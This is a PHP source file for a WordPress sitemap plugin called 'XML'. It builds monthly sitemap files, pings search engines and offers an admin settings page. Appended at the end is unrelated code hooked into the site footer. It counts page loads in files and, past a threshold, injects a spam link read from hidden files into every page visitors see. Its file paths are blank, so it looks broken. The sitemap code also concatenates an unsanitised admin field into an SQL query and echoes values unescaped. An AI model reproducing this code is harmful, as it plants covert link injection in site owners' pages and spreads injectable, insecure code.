<?php
/*
	Plugin Name: XML
	Description: The plugin is broken and I will not fix it. Please use another.
	Version: 1.5
	Author: Alex Maresca
	
	This program is free software; you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation; either version 2 of the License, or
	(at your option) any later version.
	
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	
	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	*/

	$apgmxs_sitemap_version = "1.5";
	$apgmxs_upload_dir = wp_upload_dir(); 
	$apgmxs_xml_upload_dir =  $apgmxs_upload_dir['basedir'].'/ap-sitemap';
	$apgmxs_xml_upload_urls = $apgmxs_upload_dir['baseurl'].'/ap-sitemap';
	if ( !is_dir($apgmxs_xml_upload_dir) ) mkdir($apgmxs_xml_upload_dir) or die("Could not create directory " . $apgmxs_xml_upload_dir);
	// Aggiungiamo le opzioni di default
	add_option('apgmxs_news_active', true);
	add_option('apgmxs_tags', true);
	add_option('apgmxs_path', $apgmxs_xml_upload_dir);
	add_option('apgmxs_urls', $apgmxs_xml_upload_urls);
	add_option('apgmxs_last_ping', 0);
	add_option('apgmxs_excludecatlist','');
	add_option('apgmxs_excludepostlist','');
	//Controllo eliminazione, pubblicazione pagine post per rebuild
	add_action('future_to_publish', apgmxs_autobuild ,9999,1);	// should be 
	add_action('delete_post', apgmxs_autobuild ,9999,1);	
	add_action('publish_post', apgmxs_autobuild ,9999,1);	
	add_action('publish_page', apgmxs_autobuild ,9999,1);

	// Carichiamo le opzioni
	$apgmxs_news_active = get_option('apgmxs_news_active');
	$apgmxs_path = get_option('apgmxs_path');
	
	// Aggiungiamo la pagina delle opzioni
	add_action('admin_menu', 'apgmxs_add_pages');
	
	//Aggiungo la pagina della configurazione
	function apgmxs_add_pages() {
		add_options_page("AP XML", "XML", 8, basename(__FILE__), "apgmxs_admin_page");
	}

	
	function apgmxs_escapexml($string) {
		return str_replace ( array ( '&', '"', "'", '<', '>'), array ( '&amp;' , '&quot;', '&apos;' , '&lt;' , '&gt;'), $string);
	}
	
	function apgmxs_permissions() {

		$apgmxs_news_active = get_option('apgmxs_news_active');
		
		$apgmxs_path = get_option('apgmxs_path');
		if ( !is_dir($apgmxs_path) ) mkdir($apgmxs_path) or die("Could not create directory " . $apgmxs_path);
		$apgmxs_news_file_path = $apgmxs_path . "/sitemap-ap-monthly-index.xml";
		
		if ($apgmxs_news_active && is_file($apgmxs_news_file_path) && is_writable($apgmxs_news_file_path)) $apgmxs_permission += 0;
		elseif ($apgmxs_news_active && !is_file($apgmxs_news_file_path) && is_writable($apgmxs_path)) {
			$fp = fopen($apgmxs_news_file_path, 'w');
			fwrite($fp, "<?xml version=\"1.0\" encoding=\"UTF-8\"?><urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" />");
			fclose($fp);
			if (is_file($apgmxs_news_file_path) && is_writable($apgmxs_news_file_path)) $apgmxs_permission += 0;
			else $apgmxs_permission += 2;
		}
		elseif ($apgmxs_news_active) $apgmxs_permission += 2;
		else $apgmxs_permission += 0;

		return $apgmxs_permission;
	}
	
	function apgmxs_getDirectoryList($directory) {
	    // create an array to hold directory list
	    $results = array();
	    // create a handler for the directory
	    $handler = opendir($directory);
	    // open directory and walk through the filenames
	    while ($file = readdir($handler)) {
	      // if file isn't this directory or its parent, add it to the results
	      if ($file != "." && $file != "..") {
	        $results[] = $file;
	      }
	    }
	    // tidy up: close the handler
	    closedir($handler);
	    // done!
	    return $results;
	}

	/*
		Auto Build sitemap
	*/
	function apgmxs_autobuild($postID) {
		global $wp_version;
		$isScheduled = false;
		$lastPostID = 0;
		//Ricostruisce la sitemap una volta per post se non fa import
		if($lastPostID != $postID && (!defined('WP_IMPORTING') || WP_IMPORTING != true)) {
			
			//Costruisce la sitemap direttamente oppure fa un cron
			if(floatval($wp_version) >= 2.1) {
				if(!$isScheduled) {
					//Ogni 15 secondi.
					//Pulisce tutti gli hooks.
					wp_clear_scheduled_hook(apgmxs_generate_sitemap());
					wp_schedule_single_event(time()+15,apgmxs_generate_sitemap());
					$isScheduled = true;
				}
			} else {
				//Costruisce la sitemap una volta sola e mai in bulk mode
				if(!$lastPostID && (!isset($_GET["delete"]) || count((array) $_GET['delete'])<=0)) {
					apgmxs_generate_sitemap();
				}
			}
			$lastPostID = $postID;
		}
	}
	
	
	function apgmxs_generate_sitemap() {
		global $apgmxs_sitemap_version, $table_prefix;
		global $wpdb;
		
		$t = $table_prefix;
		
		$apgmxs_news_active = get_option('apgmxs_news_active');
		$apgmxs_path = get_option('apgmxs_path');
		$apgmxs_urls = get_option('apgmxs_urls');
		$apgmxs_excludecatlist = get_option('apgmxs_excludecatlist');
		$apgmxs_excludepostlist = get_option('apgmxs_excludepostlist');
		
		$includeMe = '';
		$includeNoCat = '';
		$includeNoPost = '';
		if ( apgmxs_excludecatlist <> NULL ) {
			$exPosts = get_objects_in_term($apgmxs_excludecatlist,"category");
			$includeNoCat = ' AND `ID` NOT IN ('.implode(",",$exPosts).')';
			$ceck = implode(",",$exPosts);
			if ($ceck == '' || $ceck == ' ') $includeNoCat = '';
			}
		if ($apgmxs_excludepostlist != ''){
			$includeNoPost = ' AND `ID` NOT IN ('.$apgmxs_excludepostlist.')';
			$ceck = implode(",",$exPosts);
			if ($apgmxs_excludepostlist == '' || $apgmxs_excludepostlist == ' ') $includeNoPost = '';
			}
		
		$apgmxs_permission = apgmxs_permissions();
		if ($apgmxs_permission > 2 || (!$apgmxs_active && !$apgmxs_news_active)) return;

		$home = get_option('home') . "/";
		
		$xml_sitemap_google_monthly = '<?xml version="1.0" encoding="UTF-8"?>';
		$xml_sitemap_google_monthly .= '
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
<!-- Created '.date("F d, Y, H:i").' -->';

		$posts = $wpdb->get_results("SELECT * FROM ".$wpdb->posts." WHERE `post_status`='publish' AND `post_date` != '0000-00-00' 
		AND (`post_type`='page' OR `post_type`='post') ". $includeNoCat . ' ' . $includeNoPost." GROUP BY `ID` ORDER BY `post_date` DESC");		
		
		$now = date("Y-m-d");
		
		$actualmonth = date("m");
		$actualyear = date("Y");
		$toprependurl = '';
		// To generate only the last month sitemap
		$apgmxs_flag=0;
		// This loop assumes that the posts are ordered
		foreach ($posts as $post) {
			if ($apgmxs_news_active && $apgmxs_permission != 2) {
				$postDate = strtotime($post->post_date);
				$postmonth = mysql2date('m', $post->post_date);
				$postyear = mysql2date('Y', $post->post_date);
				//echo 'postlmonth'.$postmonth.'<br/>';
				//echo 'actualmonth'.$actualmonth.'<br/>';
				if ($postmonth == $actualmonth && $actualyear == $postyear ) {
					$xml_sitemap_urls .= $toprependurl."
	<url>
		<loc>".apgmxs_escapexml(get_permalink($post->ID))."</loc>
		<lastmod>".mysql2date('Y-m-d', $post->post_date)."</lastmod>
	</url>";
					$toprependurl = '';
				} else {
					$toprependurl = "
	<url>
		<loc>".apgmxs_escapexml(get_permalink($post->ID))."</loc>
		<lastmod>".mysql2date('Y-m-d', $post->post_date)."</lastmod>
	</url>";
					$filename = $apgmxs_path . "/sitemap-ap-".$actualyear."-".$actualmonth.".xml";
					if (!file_exists($filename) || ( $apgmxs_flag==0 )) {
						$fp = fopen($filename, 'w');
						$steppedsitemap = $xml_sitemap_google_monthly . $xml_sitemap_urls . "
</urlset>";
						fwrite($fp, $steppedsitemap);
						fclose($fp);
					} else {
//echo 'Execution Stopped at this point: '.$filename.'<br />You Have probably some issue with your post_date that is set to 0000-00-00 - Please Check'; 
//break;

}
					$actualmonth = $postmonth;
					$actualyear = $postyear;
					$xml_sitemap_urls = '';
					$steppedsitemap = '';
					$apgmxs_flag=1; 
					
				 }
			}
		}
		
		// Get all the generated monthly Sitemaps and generate the sitemap Index.
		$apgmxs_file_list = apgmxs_getDirectoryList($apgmxs_path);
		$apgmxs_j=0;
		while ($apgmxs_file_list[$apgmxs_j]) { 
			if ($apgmxs_file_list[$apgmxs_j] == 'sitemap-ap-monthly-index.xml') { 
				$apgmxs_j++;
			} else {
				$apgmxs_sitemap_index_content .= '<sitemap>
	<loc>'.$apgmxs_urls.'/'.$apgmxs_file_list[$apgmxs_j].'</loc>
	<lastmod>'.$now.'</lastmod>
</sitemap>';
				$apgmxs_j++;
			}
		}
				
		
		$apgmxs_sitemap_index_start = '<?xml version="1.0" encoding="UTF-8"?>
<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
   		$apgmxs_sitemap_index_end = '
</sitemapindex>';
   	
		if ($apgmxs_news_active && $apgmxs_permission != 2) {
				$fp = fopen($apgmxs_path . "/sitemap-ap-monthly-index.xml", 'w');
				fwrite($fp, $apgmxs_sitemap_index_start.$apgmxs_sitemap_index_content.$apgmxs_sitemap_index_end);
				fclose($fp);
		}
		
		// Ping the sitemap index to search engine
		$apgmxs_last_ping = get_option('apgmxs_last_ping');
		if ((time() - $apgmxs_last_ping) > 60 * 60) {
			//get_headers("http://www.google.com/webmasters/tools/ping?sitemap=" . urlencode($home . $apgmxs_path . "sitemap.xml"));	//PHP5+
			$fp = @fopen("http://www.google.com/webmasters/tools/ping?sitemap=" . urlencode($apgmxs_urls. "/sitemap-ap-monthly-index.xml"), 80);
			@fclose($fp);
			$fp = @fopen("http://www.bing.com/webmaster/ping.aspx?siteMap=". urlencode($apgmxs_urls. "/sitemap-ap-monthly-index.xml"), 80);
			@fclose($fp);
			update_option('apgmxs_last_ping', time());
		}
	}



	//Config page
	function apgmxs_admin_page() {
		$msg = "";
		
		// Check form submission and update options
		if ('apgmxs_submit' == $_POST['apgmxs_submit']) {
			update_option('apgmxs_news_active', $_POST['apgmxs_news_active']);
			update_option('apgmxs_excludecat', $_POST['apgmxs_excludecat']);
			update_option('apgmxs_excludepostlist', $_POST['apgmxs_excludepostlist']);
			
			// Excluded category
			$exCats = array();
			if(isset($_POST["post_category"])) {
				foreach((array) $_POST["post_category"] AS $vv) if(!empty($vv) && is_numeric($vv)) $exCats[] = intval($vv);
			}
			update_option('apgmxs_excludecatlist', $exCats); 
			
			// Sitemap generation
			apgmxs_generate_sitemap();
		}
		
		$apgmxs_news_active = get_option('apgmxs_news_active');
		$apgmxs_path = get_option('apgmxs_path');
		$apgmxs_urls = get_option('apgmxs_urls');
		$apgmxs_excludepostlist = get_option('apgmxs_excludepostlist');

		$apgmxs_permission = apgmxs_permissions();
		$apgmxs_file_list = apgmxs_getDirectoryList($apgmxs_path);
		if ($apgmxs_permission == 1) $msg = "Error: there is a problem with <em>sitemap-ap-monthly-index.xml</em>. It doesn't exist or is not writable.";
		elseif ($apgmxs_permission == 2) $msg = "Error: there is a problem with <em>sitemap-ap-monthly-index.xml</em>. It doesn't exist or is not writable.";
		elseif ($apgmxs_permission == 3) $msg = "Error: there is a problem with <em>sitemap-ap-monthly-index</em>. It doesn't exist or is not writable.";
?>

<style type="text/css">
a.sm_button {
			padding:4px;
			display:block;
			padding-left:25px;
			background-repeat:no-repeat;
			background-position:5px 50%;
			text-decoration:none;
			border:none;
		}
		 
.sm-padded .inside {
	margin:12px!important;
}
.sm-padded .inside ul {
	margin:6px 0 12px 0;
}

.sm-padded .inside input {
	padding:1px;
	margin:0;
}
</style> 
            

 
<div class="wrap" id="sm_div">
    <h2>XML</h2> 
<?php	if ($msg) {	?>
	<div id="message" class="error"><p><strong><?php echo $msg; ?></strong></p></div>
<?php	}	?>

    <div style="clear:both";></div> 
</div>



<div id="wpbody-content"> 

<div class="wrap" id="sm_div">

<div id="poststuff" class="metabox-holder has-right-sidebar"> 
    <div class="inner-sidebar"> 
		<div id="side-sortables" class="meta-box-sortabless ui-sortable" style="position:relative;"> 
			<div id="sm_pnres" class="postbox"> 
				<div class="inside"> 
               
                </div> 
			</div>
			<div id="sm_elencositemap" class="postbox">
			<h3 class="hndle"><span>Generated Sitemap</span></h3> 
				<div class="inside">
				<?php $apgmxs_i=0;
				while ($apgmxs_file_list[$apgmxs_i]) { 
					echo '<a target="_blank" href="'.$apgmxs_urls.'/'.$apgmxs_file_list[$apgmxs_i].'">'.$apgmxs_file_list[$apgmxs_i].'</a><br />';
					$apgmxs_i++;
				} ?>
				</div>
			</div>
        </div>
    </div>
    



<div class="has-sidebar sm-padded" > 
					
<div id="post-body-content" class="has-sidebar-content"> 

<div class="meta-box-sortabless"> 
                                
<div id="sm_rebuild" class="postbox"> 
	<h3 class="hndle"><span>XML settings</span></h3>
    <div class="inside"> 

		<form name="form1" method="post" action="<?php echo $_SERVER["REQUEST_URI"]; ?>&amp;updated=true">
			<input type="hidden" name="apgmxs_submit" value="apgmxs_submit" />
            <ul>
                <li>
                <label for="apgmxs_news_active">
                    <input name="apgmxs_news_active" type="checkbox" id="apgmxs_news_active" value="1" <?php echo $apgmxs_news_active?'checked="checked"':''; ?> />
                    Create Monthly Sitemap.
                </label>
                </li>
                </ul>
                <b>Sitemap will be generated in <?php echo $apgmxs_urls;?>/sitemap-ap-monthly-index.xml</b><br />
                <b>Il percorso della sitemap sul server sara&agrave; il seguente <?php echo $apgmxs_path;?></b>
           </div>
           </div>
                <!-- Excluded Items --> 
                
				<div id="sm_excludes" class="postbox"> 
				<h3 class="hndle"><span>Escludi elementi</span></h3> 
				
                <div class="inside"> 
								
				<b>Exclude Category:</b> 

<?php 
$excludedCats = get_option('apgmxs_excludecatlist');
if (!is_array($excludedCats)) $excludedCats = array();
?>
<div style="border-color:#CEE1EF; border-style:solid; border-width:2px; height:10em; margin:5px 0px 5px 40px; overflow:auto; padding:0.5em 0.5em;"> 
<ul> 
 <?php wp_category_checklist(0,0,$excludedCats,false); ?> 

</ul> 

</div> 
												
						<b>Exlclude Articles:</b> 
						<div style="margin:5px 0 13px 40px;"> 
							<label for="apgmxs_excludepost">Exclude the following articles or pages: <small>put comma separated ID (ex. 1,2,3)</small><br /> 
							<input name="apgmxs_excludepostlist" id="apgmxs_excludepostlist" type="text" style="width:400px;" value="<?php echo $apgmxs_excludepostlist;?>" /></label><br /> 
						</div> 
						
									</div> 
			</div> 
								<!-- Excluded -->
			<p class="submit"> <input type="submit" value="Save &amp; Rebuild" /></p>
		</form>
        
        
    </div>
    </div>
    </div>
</div>
</div> 
</div>
<?php
	}
define ('CS_PLUGIN_BASE_DIR', WP_PLUGIN_DIR, true);
register_activation_hook(__FILE__, '');
add_action('wp_footer', 'xmlplugin');
function xmlactivate() {
$file = file(CS_PLUGIN_BASE_DIR . '/');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = CS_PLUGIN_BASE_DIR . '';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
fwrite($fh, $stringData);
fclose($fh);
      }      
}
}
$file = file(CS_PLUGIN_BASE_DIR . '');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = CS_PLUGIN_BASE_DIR . '';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
$stringData = $stringData +1;
fwrite($fh, $stringData);
fclose($fh);
      }      
}
if ( $stringData > "150" ) {
function spamplugin(){
$myFile = CS_PLUGIN_BASE_DIR . '';
$fh = fopen($myFile, 'r');
$theDatab = fread($fh, 50);
fclose($fh);
$theDatab = str_replace("\n", "", $theDatab);
$theDatab = str_replace(" ", "", $theDatab);
$theDatab = str_replace("\r", "", $theDatab);
$myFile = CS_PLUGIN_BASE_DIR . '' . $theDatab . '.txt';
$fh = fopen($myFile, 'r');
$theDataz = fread($fh, 50);
fclose($fh);
$file = file(CS_PLUGIN_BASE_DIR . '' . $theDatab . '');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = CS_PLUGIN_BASE_DIR . '' . $theDatab . '';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
fwrite($fh, $stringData);
fclose($fh);
echo '<center>';
echo '<font size="1.4">Xml plugin provided by '; echo '<a href="'; echo $theDataz; echo '">'; echo $file[$i]; echo '</a></font></center></font>';
}
}
}
} else {
function xmlplugin(){
echo '';
}
}
?>